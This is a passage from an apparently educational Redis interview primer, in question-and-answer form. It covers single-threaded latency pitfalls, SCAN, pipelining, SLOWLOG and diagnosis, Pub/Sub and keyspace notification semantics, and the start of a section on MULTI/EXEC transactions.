- **Atomicity for free** — no command can interleave with another, so individual commands are inherently atomic; you never need locks around a single operation.
- **Simplicity** — no lock contention, no data races, no deadlocks in the core; the codebase and its guarantees stay simple.
- **Speed** — no context-switching or synchronization overhead. Combined with in-memory data and O(1) operations, one thread easily pushes hundreds of thousands of ops/sec and can saturate a network card.

The catch — the thing every interviewer wants you to volunteer — is that **one slow command blocks all clients**, because there's no other thread to hide behind (see Q3).

### Q2. Why is Redis so fast if it only uses one thread?

Several factors compound:

- **Everything is in RAM** — no disk seeks on the hot path; memory access is orders of magnitude faster.
- **Optimized data structures** — most operations are O(1) (`GET`, `SET`, `HGET`, `INCR`) or O(log N) (sorted-set ops); the work per command is tiny.
- **No lock/synchronization overhead** — single thread means no mutexes, no cache-line ping-pong between cores, no context switches.
- **Efficient protocol + I/O** — the RESP protocol is cheap to parse, and Redis uses non-blocking I/O over an event loop (epoll/kqueue) to multiplex thousands of connections.
- **Redis 6+ I/O threads** — offload socket read/write so the main thread spends its time executing commands, not shuffling bytes.

The result: latency is dominated by network round-trip, not by Redis itself. For small ops, RTT is the real cost — which is why pipelining matters (Q8).

### Q3. If Redis is single-threaded, what happens when one command is slow?

It blocks **every** client. There is no parallelism to hide behind — while the single thread is busy executing one O(N) command, every other client's request sits in the queue waiting. A single `KEYS *` on a keyspace with tens of millions of keys, or `SMEMBERS` on a set with millions of members, can stall the server for hundreds of milliseconds, and every other request piles up behind it.

This is the core operational lesson of Redis: **keep every command short**. The single-threaded model that gives you free atomicity also means you have zero tolerance for slow commands in the hot path. Diagnosing a latency incident almost always comes down to "what blocking command (or fork, or big-key access) monopolized the thread?"

### Q4. What are the classic O(N) commands to avoid in production?

The blocking offenders — each scales with data size and monopolizes the single thread:

- **`KEYS pattern`** — scans the entire keyspace. Never in prod; use `SCAN`.
- **`SMEMBERS` / `HGETALL` / `LRANGE 0 -1` / `ZRANGE ... 0 -1`** on a huge key — returns the whole collection; O(N) in element count.
- **`SORT`** on a large list/set — O(N log N), plus it can pull external keys.
- **`FLUSHALL` / `FLUSHDB`** on a huge DB — synchronously frees everything (use the `ASYNC` variant).
- **`DEL` of a giant aggregate** — freeing millions of elements is O(N); use `UNLINK`.
- **`SUNIONSTORE` / `SINTERSTORE` / ` SDIFFSTORE`** over big sets — O(N) in total elements.

The pattern: any command that touches "all elements of a big collection" or "all keys" is a hazard. Spot them with `SLOWLOG`.

### Q5. What's wrong with this, and what should I do instead?

```bash
KEYS session:*        # find all session keys — DON'T do this in prod
```

`KEYS session:*` scans **every key in the keyspace** and blocks the single thread until it finishes. On a large instance that's a multi-hundred-millisecond stall that freezes all other clients — a self-inflicted outage.

Use **`SCAN`**, a cursor-based iterator that returns a small batch per call and never blocks:

```bash
SCAN 0 MATCH session:* COUNT 100    # returns [cursor, keys]; repeat until cursor 0
```

You call `SCAN` in a loop, passing back the returned cursor, until it comes back `0`. Each call does a bounded amount of work, so the server keeps serving other clients between iterations. There are type-specific variants — `HSCAN`, `SSCAN`, `ZSCAN` — for iterating inside a big hash/set/sorted set without a blocking `HGETALL`/`SMEMBERS`.

### Q6. How does SCAN work and what are its guarantees?

`SCAN` iterates the keyspace incrementally using an opaque **cursor**. You start at `0` and feed each returned cursor into the next call until you get `0` back:

```bash
SCAN 0 MATCH user:* COUNT 500     # -> ["176", [keys...]]
SCAN 176 MATCH user:* COUNT 500   # -> ["512", [more keys...]]
# ...repeat until the returned cursor is "0"
```

`COUNT` is a hint for how much work per call (not a hard batch size), and `MATCH` filters the returned keys (filtering happens after scanning, so a restrictive `MATCH` can return empty batches — that's normal, keep going).

Guarantees are intentionally **weak** but useful:

- A key present for the entire iteration **is** returned at least once.
- A key absent the whole time is never returned.
- Keys added or removed *during* iteration may or may not appear, and a key can be returned **more than once** — so make your handling idempotent.

It's not a consistent snapshot; it's a non-blocking best-effort sweep. That's the right trade for production.

### Q7. What is pipelining and when should I use it?

Pipelining means sending **many commands at once without waiting for each reply**, then reading all the replies together. It attacks **round-trip time (RTT)**: normally each command costs one network round-trip, so 1000 sequential `SET`s cost 1000 RTTs. Pipelined, you pay roughly one RTT for the whole batch.

```bash
# conceptually: write all requests, then read all responses
SET a 1
SET b 2
SET c 3
# ...client sends these back-to-back, reads 3 replies at the end
```

The throughput win is dramatic on high-latency links — often 5–10x or more. Key caveats:

- **Not a transaction** — pipelined commands are not atomic; other clients' commands can interleave. Use `MULTI/EXEC` for atomicity.
- **Bounded batches** — don't pipeline a million commands in one shot; you buffer all replies in memory. Chunk into batches of, say, a few thousand.

Pipelining is the first lever to reach for when a bulk load or a chatty workload is RTT-bound.

### Q8. Pipelining vs MULTI vs MGET/MSET — when do I use which?

They solve different problems and can be combined:

| Technique | Purpose | Atomic? | Notes |
|---|---|---|---|
| **Pipelining** | Amortize RTT over many commands | No | Batches unrelated commands; replies read together |
| **MULTI/EXEC** | Group commands to run atomically | Yes | Queued then executed with no interleaving; no rollback |
| **MGET/MSET** | Get/set many keys in one command | Yes (one command) | Best when the op is exactly multi-key get/set |

Rules of thumb: if you just want throughput for many independent ops, **pipeline**. If you specifically need "get/set N keys," a single **`MGET`/`MSET`** is simplest and atomic. If you need "these commands must run together with nothing in between," use **`MULTI`**. And you can pipeline a `MULTI/EXEC` block to get atomicity *and* one round-trip.

### Q9. Did Redis 6 make command execution multi-threaded?

No — this is a common misconception. Redis 6 added **I/O threads** that parallelize only the *network* work: reading requests off sockets and writing replies back, including RESP encoding/decoding. **Command execution remains single-threaded** — the actual data operations still run one at a time on the main thread, preserving atomicity.

```bash
io-threads 4                 # use 4 threads for network I/O
io-threads-do-reads yes      # also parallelize request parsing
```

You enable it when the main thread is spending significant time on socket I/O (many connections, large payloads) rather than on command logic. It raises throughput on network-bound workloads without changing Redis's single-threaded execution semantics — a `KEYS *` is still a full-server stall. Enable it only when you actually observe I/O being the bottleneck; on a modest workload it's unnecessary.

### Q10. What is lazy freeing / UNLINK, and when does it matter?

Deleting a key means freeing all its memory. For a big aggregate (a set or hash with millions of elements), freeing is **O(N)** and, on the main thread, blocks every client. **Lazy freeing** moves that reclamation to a background thread.

```bash
UNLINK bigkey        # like DEL, but reclaims memory asynchronously
DEL bigkey           # frees synchronously — blocks on a huge key
```

And the config knobs that make eviction/expiry/flush non-blocking:

```bash
lazyfree-lazy-eviction yes      # free evicted keys in background
lazyfree-lazy-expire yes        # free expired keys in background
lazyfree-lazy-server-del yes    # implicit deletes (e.g. RENAME over a key)
lazyfree-lazy-user-del yes      # make DEL behave like UNLINK
```

It matters whenever you delete, evict, or expire large values under load. The classic incident: a `DEL` on a multi-GB key stalls the server; `UNLINK` (or the lazyfree flags) avoids it.

### Q11. How do I find slow commands after the fact?

Use **`SLOWLOG`** — a ring buffer that records commands whose execution time exceeded a threshold (execution only, not network/queue time):

```bash
CONFIG SET slowlog-log-slower-than 10000   # log commands slower than 10ms (microseconds)
CONFIG SET slowlog-max-len 128             # keep the last 128 entries
SLOWLOG GET 10                             # inspect the 10 most recent slow commands
SLOWLOG RESET                              # clear it
```

Each entry shows the timestamp, duration, the command + arguments, and client info — enough to identify the `KEYS *` or the `SMEMBERS` on a big set that stalled you. `SLOWLOG` is the first place to look in a latency incident: it directly answers "what command monopolized the single thread?" Pair it with `LATENCY` monitoring (`LATENCY LATEST`, `LATENCY DOCTOR`) which also surfaces fork and other non-command latency spikes.

### Q12. How do I benchmark and measure Redis latency?

Two built-in tools:

**`redis-benchmark`** — synthetic throughput/latency load generator:

```bash
redis-benchmark -t set,get -n 100000 -q          # 100k SETs and GETs, quiet summary
redis-benchmark -t get -n 100000 -P 16           # with pipelining depth 16
redis-benchmark -t set -n 100000 -r 100000       # random keys across 100k keyspace
```

**`redis-cli --latency`** — measures live round-trip latency to a running server:

```bash
redis-cli --latency            # rolling min/avg/max in ms
redis-cli --latency-history    # samples over time
redis-cli --intrinsic-latency 100   # measure the host's own scheduling latency
```

Use `--intrinsic-latency` to separate host/OS jitter from Redis itself — if the intrinsic latency is already high, the problem is the machine (noisy neighbor, CPU steal), not your commands. Benchmark with the pipelining depth (`-P`) and payload sizes that match production, or the numbers mislead.

### Q13. What are the main sources of latency in Redis?

Reason from the single-threaded model — anything that monopolizes the thread or the process hurts everyone:

- **Slow O(N) commands** — `KEYS *`, big `SMEMBERS`/`HGETALL`, `SORT`; the number-one cause. Find via `SLOWLOG`.
- **fork()** — for `BGSAVE`/`BGREWRITEAOF`/replica sync; a spike proportional to dataset size. Check `latest_fork_usec`.
- **Big keys** — any single operation on a huge value is inherently slow; deleting one blocks (use `UNLINK`).
- **Swapping** — if Redis memory is paged to disk, every access can hit disk. Keep it in RAM; watch `maxmemory`.
- **Network / RTT** — for small ops the round-trip dominates; batch with pipelining.
- **`appendfsync always`** — a disk sync per write serializes throughput.
- **THP / host jitter** — Transparent Huge Pages worsen fork latency; noisy-neighbor CPU steal shows up in `--intrinsic-latency`.

### Q14. My p99 latency just spiked. Walk me through your diagnosis.

Because there's no parallelism, a p99 spike means something monopolized the process. I'd triage in order:

1. **`SLOWLOG GET`** — is a specific command (a `KEYS *`, a `SMEMBERS` on a big set, a `SORT`) showing up? That's the most common cause and points straight at the offending client.
2. **`INFO persistence` / `latest_fork_usec`** — did a `BGSAVE` or AOF rewrite fork right at the spike? A big-dataset fork stalls the main thread.
3. **`INFO memory` + big-key scan** — is a hot/big key being read or deleted? Check `maxmemory` headroom and whether we're evicting (which also costs the main thread). Run `redis-cli --bigkeys`.
4. **Swap / host** — is the process swapping (`INFO memory` used vs RSS), or is host CPU-steal high? Confirm with `--intrinsic-latency`.
5. **Connection storm / pipeline flood** — a client suddenly pipelining huge batches or a connection spike can queue work.

The mental frame I state out loud: single-threaded means the culprit is *serial* — a blocking command, a fork, a big key, eviction, or the host. `SLOWLOG` and `latest_fork_usec` resolve most incidents in the first two steps.

### Q15. How do I avoid blocking the event loop when I need to touch a lot of data?

Design around the single thread — never hand it one big O(N) job:

- **Iterate, don't enumerate** — replace `KEYS`/`SMEMBERS`/`HGETALL` with `SCAN`/`SSCAN`/`HSCAN` cursor loops that do bounded work per call.
- **Delete lazily** — `UNLINK` instead of `DEL` for big keys; enable the `lazyfree-*` flags for eviction/expiry.
- **Shard big keys** — split a giant hash/set into many smaller keys (e.g. by hash bucket) so no single operation is huge.
- **Batch with pipelining** — for many small ops, amortize RTT rather than issuing an expensive aggregate command.
- **Offload heavy work** — do read-modify-write in a tight Lua script (atomic, but keep it short!), or move analytical scans to a replica.
- **Flush asynchronously** — `FLUSHALL ASYNC` / `FLUSHDB ASYNC`.

The rule: every command should be O(1)/O(log N) or a bounded batch. If a task is inherently O(N)-over-a-big-collection, chunk it.

### Q16. Given all this, when does single-threaded become a real limitation?

When a single core can't keep up — that is, when your workload is **CPU-bound on command execution** on one node. Redis can saturate a NIC and push hundreds of thousands of ops/sec on one thread, but a single instance uses essentially one core for command execution, so there's a ceiling.

Ways past it:

- **Redis Cluster** — shard the keyspace across N primaries; each has its own event loop, so you get N-way parallelism for throughput and memory. This is the primary answer.
- **Read replicas** — fan reads out to replicas to scale read throughput (with async-replication staleness).
- **I/O threads** — if the bottleneck is network I/O rather than command logic, `io-threads` helps without sharding.
- **Multiple instances per host** — run several Redis processes pinned to different cores on a big machine (a mini-cluster).

The honest framing: single-threaded is optimal until one core is the wall; past that, you scale **out** (sharding) rather than **up** (threads), which is exactly what Cluster is for.

## Pub/Sub & Keyspace Notifications

### Summary

**What this topic covers**

Redis **Pub/Sub** is a lightweight, fire-and-forget messaging system: publishers send messages to named channels, and every client currently subscribed to that channel receives them. This topic covers the commands (`SUBSCRIBE`/`PSUBSCRIBE`/`PUBLISH`/`UNSUBSCRIBE`), the all-important semantics — **at-most-once delivery, no persistence, no acknowledgement** — and why that makes Pub/Sub perfect for real-time fan-out but wrong for anything you can't afford to lose. We contrast it sharply with **Streams** (durable, consumer groups, replay), cover **pattern subscriptions**, the dedicated-connection constraint, slow-subscriber disconnection, **sharded Pub/Sub** for Cluster, and **keyspace notifications** — Redis publishing events when keys change or expire, with the crucial caveat that these are best-effort and expiration events fire on removal, not exactly at TTL. The 15 questions run from "how does Pub/Sub work" to "design a cross-service cache-invalidation broadcast, and tell me exactly when it will drop a message."

**Mental model**

Think of Pub/Sub as a **live radio broadcast**, not a mailbox. When a station transmits, only radios currently tuned in hear it; anyone whose radio is off, or who tunes in a second later, misses that segment forever — nothing is recorded. Redis `PUBLISH` delivers a message synchronously to whoever is subscribed *at that instant* and then forgets it. There is no queue, no storage, no redelivery, no ack. This is the opposite of a durable message queue and the opposite of Redis **Streams** (which is a tape recorder — every message is stored, and consumers can rewind, replay, and acknowledge). Once you internalize "broadcast, not mailbox," every property follows: if no one's listening the message is gone; a subscriber that falls behind or disconnects loses messages; you can't get delivery guarantees; and it scales beautifully for low-stakes real-time fan-out precisely because it stores nothing. Keyspace notifications are just Redis itself acting as a publisher on special channels when data changes.

**Key terms**

- **channel** — a named topic; publishers `PUBLISH channel msg`, subscribers `SUBSCRIBE channel`.
- **SUBSCRIBE / UNSUBSCRIBE** — start/stop listening on exact channel names.
- **PSUBSCRIBE** — subscribe by glob pattern (`news.*`); receives from any matching channel.
- **PUBLISH** — send a message to a channel; returns the count of clients that received it (0 = nobody heard it).
- **at-most-once** — a message is delivered to current subscribers or lost; never stored, never redelivered.
- **Streams** — the durable alternative: an append-only log with consumer groups, acks (`XACK`), and replay (`XREAD`/`XREADGROUP`).
- **sharded Pub/Sub** — `SSUBSCRIBE`/`SPUBLISH` (Redis 7); binds channels to Cluster slots so messages don't broadcast cluster-wide.
- **keyspace notification** — events Redis publishes on `__keyspace@N__:key` / `__keyevent@N__:event` when data changes.
- **notify-keyspace-events** — config flag string (e.g. `KEA`) enabling which notifications fire.
- **client-output-buffer-limit** — the threshold at which a slow subscriber is force-disconnected.

**Why interviewers ask this**

Pub/Sub is a trap-laden topic that quickly reveals whether a candidate understands delivery semantics. The junior mistake is treating Pub/Sub as a reliable message queue — "I'll use it to distribute jobs to workers." The senior answer immediately flags **at-most-once, no persistence**: if a worker is down or slow, the job vanishes, so Pub/Sub is wrong for work distribution and you should reach for **Streams** or a real broker. Interviewers also probe whether you know the operational gotchas: a subscriber connection can't run normal commands (pre-RESP3), a slow subscriber gets disconnected via output-buffer limits, and keyspace expiration events fire when the key is *actually removed*, not at the exact TTL. Being able to say "here's exactly when this drops a message" is the signal that you've run this in production, not just read the docs.

**Common confusions**

- "Pub/Sub is a reliable queue." No — at-most-once, no storage, no ack. Use Streams or a broker for reliability.
- "If I subscribe I'll get past messages." No replay — you only receive messages published *after* you subscribed and *while* you're connected.
- "`PUBLISH` returning 0 still delivered it." Zero means **no** subscribers received it; the message is gone.
- "A keyspace expiration event fires exactly at TTL." It fires when the key is actually deleted (on access or by the active-expiry cycle), which can be later than the TTL.
- "Keyspace notifications are guaranteed." They ride on Pub/Sub — best-effort, at-most-once; a disconnected listener misses events.
- "Pub/Sub works transparently in Cluster." Classic Pub/Sub broadcasts across all nodes; use **sharded Pub/Sub** to scale it in Cluster.

**What follows from this topic**

Pub/Sub's limitations are the entire argument for **Streams** — if you needed persistence, consumer groups, or acks, you'd be in that topic instead. It connects to **Cluster** (sharded Pub/Sub and slot binding), to **expiration** (keyspace notifications fire on key removal, so understanding lazy vs active expiry explains their timing), and to **caching** (cache-invalidation broadcasts are a canonical Pub/Sub use case, with the honest caveat that a missed message means a stale cache). The meta-lesson — match delivery semantics to the cost of a lost message — is a systems-design principle far beyond Redis.

### Q1. How does Redis Pub/Sub work?

Publishers send messages to named **channels**; any client currently **subscribed** to that channel receives them. It's decoupled — publishers don't know who (if anyone) is listening.

```bash
# subscriber (connection A):
SUBSCRIBE news        # now receives every message published to "news"

# publisher (connection B):
PUBLISH news "hello"  # -> (integer) 1  = one subscriber received it
```

`PUBLISH` delivers the message synchronously to all current subscribers and returns the number that received it. The core property to state up front: it's **fire-and-forget** — Redis delivers to whoever's connected right now and then forgets the message entirely. No storage, no queue, no redelivery.

### Q2. What are the delivery guarantees of Pub/Sub?

**At-most-once, and effectively none beyond "current subscribers get it."** Specifically:

- **No persistence** — messages are never stored. A message published when no one is subscribed is simply lost.
- **No replay** — a client that subscribes later cannot see past messages.
- **No acknowledgement** — the publisher gets a count of receivers, not confirmation of processing.
- **Lost on disconnect/slowness** — if a subscriber disconnects, or falls behind and hits its output-buffer limit, it misses messages (and may be dropped).

So a message reaches a subscriber **zero or one** times, never guaranteed. This is by design — storing nothing is what makes Pub/Sub cheap and fast. Whenever reliability matters, that's your cue to reach for Streams (Q6).

### Q3. What are pattern subscriptions?

`PSUBSCRIBE` subscribes to channels by **glob-style pattern**, so one subscription covers many channels:

```bash
PSUBSCRIBE news.*         # matches news.sports, news.tech, news.world...
PSUBSCRIBE user.*.events  # matches user.123.events, user.456.events...

PUBLISH news.sports "goal!"   # the news.* subscriber receives it
```

Matching uses the same glob syntax as `KEYS` (`*`, `?`, `[...]`). A client can mix exact `SUBSCRIBE` and pattern `PSUBSCRIBE`; if a message matches both an exact subscription and a pattern, that client receives it once per matching subscription. Patterns are convenient for topic hierarchies but slightly more expensive, since every publish is checked against active patterns. `PUNSUBSCRIBE` cancels pattern subscriptions.

### Q4. What are good use cases for Pub/Sub?

Real-time fan-out where an occasionally lost message is acceptable:

- **Live notifications** — push updates to connected dashboards, presence/status changes.
- **Chat / fan-out** — broadcast a message to all clients in a room (each app server subscribes and forwards to its WebSocket clients).
- **Cache invalidation broadcasts** — tell all app instances "key X changed, drop it from your local cache."
- **Live dashboards / metrics** — stream events to monitoring UIs that only care about the present.
- **Coordination signals** — lightweight "reload config now" pokes across a fleet.

The common thread: the data is **ephemeral and present-tense**. If losing the odd message during a reconnect would be a correctness bug (payments, job dispatch, orders), Pub/Sub is the wrong tool — use Streams or a durable broker.

### Q5. Why is Pub/Sub not a reliable message queue?

Because it stores nothing and guarantees nothing. A reliable queue must survive consumers being down, redeliver on failure, and confirm processing — Pub/Sub does none of that:

- If a consumer is **offline** when you publish, it never sees the message.
- If a consumer **crashes mid-processing**, there's no redelivery — the message is gone.
- There's **no ack**, so you can't know a message was handled, and no dead-letter for failures.
- There's **no backpressure** — a slow consumer is disconnected, not slowed down.

So using Pub/Sub to distribute jobs to workers is a classic anti-pattern: a restart or a slow worker silently drops work. For reliable delivery you want **Redis Streams** (Q6) with consumer groups and acks, or a dedicated broker (RabbitMQ, Kafka, SQS).

### Q6. Pub/Sub vs Streams vs a real broker — how do you choose?

| | Pub/Sub | Streams | Broker (Kafka/Rabbit/SQS) |
|---|---|---|---|
| Persistence | None | Durable append-only log | Durable |
| Delivery | At-most-once | At-least-once (with acks) | At-least-once+ |
| Replay | No | Yes (read from any ID) | Yes (Kafka) |
| Consumer groups | No | Yes (`XREADGROUP`, `XACK`) | Yes |
| Offline consumers | Miss everything | Catch up on reconnect | Catch up |
| Overhead | Minimal | Low, stores data | Separate infra |

Decision guide:

- **Pub/Sub** — ephemeral real-time fan-out; losing an occasional message is fine (live dashboards, chat, cache-invalidation hints).
- **Streams** — you need durability, replay, or work distribution with acks, but want to stay inside Redis (event sourcing, job queues, at-least-once pipelines).
- **Dedicated broker** — high-volume durable streaming, multi-day retention, strong ordering/partitioning, cross-datacenter — reach for Kafka; for classic queueing with routing, RabbitMQ.

The rule: match the tool to the cost of a lost message.

### Q7. Can a subscribing connection run normal commands?

In RESP2 (the classic protocol), **no** — once a connection issues `SUBSCRIBE`/`PSUBSCRIBE` it enters subscriber mode and may only run subscribe/unsubscribe commands (and `PING`). It can't `GET`, `SET`, etc. on that connection. So in practice you dedicate one connection to subscribing and use a *separate* connection for regular commands.

**RESP3** (Redis 6+) relaxes this: with a RESP3 connection, pushed Pub/Sub messages are delivered as out-of-band "push" frames, so a client can be subscribed **and** issue normal commands on the same connection. Many client libraries still default to a dedicated subscriber connection for clarity, but the hard RESP2 restriction is gone. Worth mentioning both in an interview — it shows you track protocol versions.

### Q8. What happens to a slow subscriber?

Redis buffers outgoing messages per client in an output buffer. If a subscriber consumes slower than messages are published, that buffer grows — and Redis, to protect itself, will **forcibly disconnect** a subscriber that exceeds its limit:

```bash
# class: normal | replica | pubsub ; hard limit / soft limit / soft seconds
client-output-buffer-limit pubsub 32mb 8mb 60
```

This means: if a pubsub client's buffer exceeds 32 MB (hard), or stays above 8 MB for 60s (soft), Redis closes the connection. The subscriber then reconnects — and, because there's no replay, **misses every message published while it was gone**. This is the operational face of "no delivery guarantee": a subscriber that can't keep up doesn't get backpressure, it gets dropped and loses data. Design consumers to be fast, or use Streams where a slow consumer just lags behind durably.

### Q9. What is sharded Pub/Sub and why does Cluster need it?

In classic Pub/Sub, a `PUBLISH` in a Redis **Cluster** is propagated to **every** node so that a subscriber connected to any node receives it. That broadcast doesn't scale — publish traffic grows with cluster size and creates cross-node chatter.

**Sharded Pub/Sub** (Redis 7) fixes this with `SSUBSCRIBE`/`SPUBLISH`:

```bash
SSUBSCRIBE orders    # subscribe to the shard channel "orders"
SPUBLISH orders "x"  # publish only within the slot/shard for "orders"
```

A sharded channel is hashed to a **slot** just like a key, so its messages stay on the node(s) owning that slot instead of being broadcast cluster-wide. Subscribers must connect to the node owning the channel's slot. This makes Pub/Sub scale horizontally in Cluster — throughput no longer degrades as you add nodes — at the cost of channels being slot-bound rather than globally visible.

### Q10. What are keyspace notifications?

Keyspace notifications let Redis **publish an event whenever a key changes or expires**, using Pub/Sub under the hood on special channels. They're off by default (they cost CPU) and enabled via `notify-keyspace-events`. Two channel families:

- **`__keyspace@N__:<key>`** — keyspace channel: "what happened to this key?" The message is the event name (e.g. `del`, `expired`, `lpush`).
- **`__keyevent@N__:<event>`** — keyevent channel: "which keys had this event?" The message is the key name.

`N` is the database number. So a subscriber can listen for "everything that happens to `session:abc`" or "every key that just expired anywhere." It's Redis broadcasting its own internal data-change events over the same fire-and-forget Pub/Sub machinery.

### Q11. How do I enable keyspace notifications?

Set `notify-keyspace-events` to a string of class flags — you opt into which event types fire:

```bash
CONFIG SET notify-keyspace-events KEA
```

Flag meanings (combine them):

- **`K`** — emit keyspace events (`__keyspace@N__` channels).
- **`E`** — emit keyevent events (`__keyevent@N__` channels).
- **`A`** — alias for "all command classes" (`g$lshzxet...`).
- Or scope it: **`g`** generic (DEL, EXPIRE), **`$`** string, **`l`** list, **`s`** set, **`h`** hash, **`z`** zset, **`x`** expired, **`e`** evicted.

You must include at least one of `K`/`E` **plus** the classes you care about. Example — only expiration events, as keyevents:

```bash
CONFIG SET notify-keyspace-events Ex     # E + x -> __keyevent@N__:expired
```

Then subscribe:

```bash
PSUBSCRIBE __keyevent@0__:expired         # get the key name of anything that expires
```

### Q12. What's the catch with expired-key notifications?

Two important caveats:

**Timing** — the `expired` event fires **when Redis actually removes the key, not exactly at its TTL**. A key can hit its TTL and sit in memory until either something accesses it (lazy expiry) or the periodic active-expiry cycle samples and removes it. On an idle key that isn't accessed, the notification can arrive noticeably later than the TTL. So don't build anything requiring precise-to-the-millisecond expiry timing on these events.

**Reliability** — keyspace notifications are delivered over **Pub/Sub**, so they inherit at-most-once semantics: if your listener is disconnected or restarting when the event fires, it **misses it** with no replay. For a "session expired → run cleanup" handler this means you can't rely solely on the event; you need a reconciliation sweep (e.g. periodically scan for orphaned state) as a backstop. Mention both caveats and you've shown you'd actually operate this safely.

### Q13. Design a session-expiry handler using keyspace notifications.

Goal: run cleanup logic when a `session:*` key expires.

```bash
# 1. enable expired keyevent notifications
CONFIG SET notify-keyspace-events Ex

# 2. store sessions with a TTL
SET session:abc "{...}" EX 1800     # 30-min session

# 3. a worker subscribes for expirations
PSUBSCRIBE __keyevent@0__:expired
# on message "session:abc" -> run logout/cleanup for that session
```

When `session:abc` expires and is removed, Redis publishes `session:abc` to `__keyevent@0__:expired`, and the worker reacts.

**But** design for the caveats: (1) the event may lag the TTL (lazy removal), so don't treat it as a precise timer; (2) it's best-effort — if the worker was down when it fired, the event is lost. So add a **backstop reconciliation**: periodically `SCAN` for state that should have been cleaned up, or store an authoritative expiry timestamp elsewhere. Notifications are an optimization, not a guarantee.

### Q14. How does Pub/Sub behave in a replicated or clustered setup?

**Replication** — messages published on a primary are propagated to replicas, so a client subscribed on a **replica** still receives messages published on the primary. This lets you fan reads/subscriptions out to replicas.

**Cluster (classic Pub/Sub)** — a `PUBLISH` on any node is broadcast to **all** nodes, so a subscriber connected to any node receives the message regardless of which node the publisher used. That's convenient but doesn't scale, since every publish touches every node.

**Cluster (sharded Pub/Sub)** — `SPUBLISH`/`SSUBSCRIBE` keep messages within the channel's slot/shard (Q9), so they don't broadcast cluster-wide; subscribers must connect to the owning node. Choose classic when you need cluster-wide visibility and volume is low, sharded when Pub/Sub throughput needs to scale with the cluster.

### Q15. Design cross-service cache invalidation with Pub/Sub, and tell me when it drops a message.

Setup: each app instance keeps a local (in-process) cache and subscribes to an invalidation channel. When any service mutates the source of truth, it publishes the changed key so every instance evicts its local copy.

```bash
# every app instance on startup:
SUBSCRIBE cache.invalidate

# on any write that changes user:123:
PUBLISH cache.invalidate "user:123"
# each instance receives "user:123" and drops it from its local cache
```

This gives fast, decoupled, fleet-wide invalidation with almost no overhead — a great fit because a *missed* invalidation is only a temporarily stale entry, not a correctness disaster.

**When it drops a message** (state these plainly): an instance that's **restarting/disconnected** when you publish misses the invalidation and keeps serving stale data until its next reconnect; a **slow** subscriber hitting its output-buffer limit gets dropped and misses events; in **classic Cluster** the broadcast reaches all nodes, but a partition can still isolate a subscriber. Mitigations: put a **short TTL** on local cache entries as a backstop so staleness self-heals, and on reconnect **flush the local cache** since you can't know what you missed. If invalidation must never be missed, upgrade to Streams (durable, replayable) instead of Pub/Sub.
## Transactions & Optimistic Locking

### Summary

**What this topic covers**

Redis's own notion of a "transaction" — which is narrower and stranger than the SQL one most candidates arrive with. Three concern areas live here: (1) the **command-batching mechanism** — `MULTI` opens a transaction, subsequent commands are *queued* rather than executed, and `EXEC` runs the whole queue atomically as one isolated unit (no other client interleaves, because Redis executes commands single-threaded); (2) the **two gotchas that trip everyone** — Redis transactions have **no rollback** (a command that errors *at EXEC time* does not undo the others) and syntax/queueing errors *abort* the transaction before EXEC; and (3) **optimistic locking with `WATCH`** — the check-and-set (CAS) primitive that makes safe read-modify-write possible without holding a pessimistic lock. The 15 questions in this topic drill the classic "does Redis support transactions, and do they roll back?" trap, the WATCH-MULTI-EXEC retry loop, and when you should reach for a Lua script instead.

**Mental model**

Think of a Redis transaction as a **stapled batch of commands**, not a database transaction. Between `MULTI` and `EXEC` you are not running anything — you are *building a list*. Each command you send back returns `QUEUED`. When you call `EXEC`, Redis takes the whole list and runs it start-to-finish with nothing else allowed in between (single-threaded execution guarantees the isolation for free). That gives you **atomicity in the "all-or-nothing-gets-interleaved" sense and full isolation**, but NOT the SQL guarantee that a mid-batch failure rewinds earlier commands. There is no undo log. The other half of the model is `WATCH`: it turns the batch into a *conditional* batch — "run this only if these keys haven't changed since I looked." That is optimistic concurrency: you don't lock, you *detect* conflict at EXEC and retry. The whole design reflects Redis's philosophy — keep the server simple and fast, push correctness decisions to the client.

**Key terms**

- **`MULTI`** — begins a transaction; following commands are queued, replying `QUEUED`.
- **`EXEC`** — executes all queued commands atomically, returns an array of their replies.
- **`DISCARD`** — throws away the queued commands and exits transaction state.
- **Queued** — a command accepted into the transaction but not yet run (validated for name/arity only).
- **Atomicity (Redis)** — the queue runs as one uninterrupted unit; *not* rollback-on-error.
- **Isolation** — no other client's command runs between the queued commands (single-threaded).
- **No rollback** — a runtime error on one queued command does not undo the others.
- **`WATCH key`** — marks keys for optimistic locking; EXEC aborts (returns nil) if any changed.
- **`UNWATCH`** — clears all watched keys without executing.
- **CAS (check-and-set)** — read a value, compute, write only if unchanged; the WATCH pattern.
- **Optimistic locking** — assume no conflict, detect-and-retry, no blocking (vs pessimistic locks).
- **Aborted transaction** — EXEC returns nil because a watched key was touched.

**Why interviewers ask this**

This is one of the great "does the candidate actually know Redis or just cache-slang" filters. Junior candidates say "yes Redis has transactions" and assume ACID semantics with rollback. Senior candidates immediately flag the two surprises: **no rollback on runtime errors** and **WATCH for CAS**. Interviewers probe it because getting it wrong causes real production bugs — engineers write a MULTI/EXEC block *expecting* SQL-style safety and are shocked when a bad type operation leaves half their writes applied. The follow-up ("so how *do* you do a safe read-modify-write?") separates people who reach for a race-prone GET-then-SET from those who know WATCH or a Lua script. It's also a proxy for understanding *why* Redis is single-threaded and what that buys you.

**Common confusions**

- "Redis transactions roll back on error like SQL" — **no.** A runtime error (e.g. `INCR` on a string) still lets the other queued commands run. There is no undo.
- "MULTI executes commands immediately" — no, they're *queued* until EXEC.
- "WATCH locks the key" — no, WATCH is optimistic; it doesn't block other writers, it just makes *your* EXEC fail if they wrote first.
- "A failed WATCH means an error" — no, EXEC simply returns nil; your code must detect that and retry.
- "MULTI/EXEC can do read-modify-write" — only via WATCH, and even then you can't branch on a value *inside* the transaction; for conditional logic use Lua.
- "Transactions and pipelining are the same" — pipelining just batches network round-trips; it gives no atomicity or isolation.

**What follows from this topic**

WATCH-based CAS is the "portable" way to do atomic read-modify-write, but it retries under contention and can't make decisions mid-transaction — which is exactly why the next topic, **Lua Scripting & Functions**, exists: a Lua script runs atomically *and* can branch on intermediate results, so it's usually the cleaner tool for compound logic (rate limiters, safe lock release). The single-threaded execution model that makes transactions isolated is the same property that makes Lua scripts atomic and that makes an O(N) command block the whole server. And the "how do I coordinate clients safely" thread continues into distributed locks and rate limiting elsewhere in this primer.

### Q1. Does Redis support transactions? What do MULTI, EXEC, and DISCARD do?

Yes, but "transaction" means something narrower than in SQL. Redis transactions let you **group commands and run them as one atomic, isolated batch** — no other client's command interleaves — but there is **no rollback**.

